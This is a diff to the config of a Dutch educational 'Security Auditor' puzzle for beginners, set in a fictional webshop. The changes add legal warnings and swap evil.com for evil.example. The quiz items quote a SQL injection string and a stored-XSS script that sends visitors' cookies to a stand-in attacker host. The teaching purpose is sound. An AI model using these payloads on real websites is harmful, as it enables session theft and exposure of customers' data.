@@ -6,7 +6,7 @@ const config: PuzzleLabConfig = {
     introEmoji: '🛡️',
     introTitle: 'Security Auditor',
     introDescription:
-        'De webshop van FreshDrop gaat morgen live — maar de eigenaar maakt zich zorgen over de beveiliging. Jij bent ingeschakeld als junior security auditor. Vind de kwetsbaarheden voordat een hacker dat doet. Ethisch hacken: beschermen, niet breken.',
+        'De webshop van FreshDrop gaat morgen live — maar de eigenaar maakt zich zorgen over de beveiliging. Jij bent ingeschakeld als junior security auditor. Vind de kwetsbaarheden voordat een hacker dat doet. Ethisch hacken: beschermen, niet breken. Let op: probeer deze technieken nooit uit op een echte website of app zonder uitdrukkelijke toestemming van de eigenaar — dat is strafbaar (computervredebreuk).',
     introFeatures: [
         'Controleer een website op de meest voorkomende kwetsbaarheden',
         'Leer de OWASP Top 10 kennen — de lijst van meest voorkomende webkwetsbaarheden, samengesteld door een internationale beveiligingsorganisatie',
@@ -20,7 +20,7 @@ const config: PuzzleLabConfig = {
             title: 'Welke kwetsbaarheid is dit?',
             type: 'multiple-choice',
             description:
-                'Je test het zoekformulier van FreshDrop. In het zoekveld typ je:\n\n```\n\' OR \'1\'=\'1\n```\n\nDe webshop geeft plotseling de VOLLEDIGE klantendatabase terug — namen, e-mails en adressen van alle klanten.\n\nWat voor kwetsbaarheid heb je ontdekt?',
+                'Je test het zoekformulier van FreshDrop. In het zoekveld typ je:\n\n```\n\' OR \'1\'=\'1\n```\n\nDe webshop geeft plotseling de VOLLEDIGE klantendatabase terug — namen, e-mails en adressen van alle klanten.\n\nWat voor kwetsbaarheid heb je ontdekt?\n\nAlleen oefenen in deze veilige omgeving — nooit op echte systemen zonder toestemming.',
             clues: [
                 'De website stuurt je invoer rechtstreeks naar de database zonder het te controleren.',
                 'De invoer breekt de database-query: \' sluit een tekstveld af, OR \'1\'=\'1 is altijd waar.',
@@ -80,11 +80,11 @@ const config: PuzzleLabConfig = {
             title: 'Wat is het risico van dit script?',
             type: 'multiple-choice',
             description:
-                'Je test de beoordelingen-sectie van FreshDrop. Je plaatst als recensie:\n\n```html\n<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>\n```\n\nDe webshop slaat de recensie op en toont hem aan alle bezoekers. Wanneer iemand de pagina bezoekt, wordt het script uitgevoerd.\n\nWat kan een aanvaller hiermee bereiken?',
+                'Je test de beoordelingen-sectie van FreshDrop. Je plaatst als recensie:\n\n```html\n<script>document.location=\'https://evil.example/steal?c=\'+document.cookie</script>\n```\n\nDe webshop slaat de recensie op en toont hem aan alle bezoekers. Wanneer iemand de pagina bezoekt, wordt het script uitgevoerd.\n\nWat kan een aanvaller hiermee bereiken?\n\nAlleen oefenen in deze veilige omgeving — nooit op echte systemen zonder toestemming.',
             clues: [
                 'Het script wordt uitgevoerd IN de browser van de bezoeker — op de echte FreshDrop-pagina.',
                 'document.cookie bevat de sessiecookies van de ingelogde bezoeker.',
-                'De aanvaller stuurt die cookies naar zijn eigen server (evil.com).',
+                'De aanvaller stuurt die cookies naar zijn eigen server (evil.example).',
             ],
             extraClues: [
                 'Dit heet Stored XSS (Cross-Site Scripting) — het kwaadaardige script wordt opgeslagen en uitgevoerd bij elke bezoeker.',
